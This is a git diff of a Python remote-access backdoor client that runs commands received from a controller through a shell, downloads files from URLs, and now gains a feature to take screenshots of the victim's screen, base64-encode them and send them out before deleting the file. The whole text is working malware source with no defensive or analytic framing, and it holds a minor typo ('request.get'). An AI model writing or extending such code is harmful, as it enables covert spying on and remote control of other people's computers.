@@ -9,7 +9,7 @@ import shutil
 import sys
 import time
 import requests
-
+from mss import mss
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -23,6 +23,10 @@ def reliable_recv():
             return json.loads(data)
         except ValueError:
             continue
+
+def screenshot():
+    with mss() as screenshot:
+        screenshot.shot()
 
 def download(url):
     get_response = request.get(url)
@@ -64,7 +68,14 @@ def shell():
                 reliable_send("[+] Downloaded file from specified URL!")
             except:
                 reliable_send("[-] Failed to download that file")
-
+        elif command[:10] == "screenshot":
+            try:
+                screenshot()
+                with open("monitor-1.png", "rb") as sc:
+                    reliable_send(base64.b64encode(sc.read()))
+                os.remove("monitor-1.png")
+            except:
+                reliable_send("[!!] Failed to take screenshot")
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
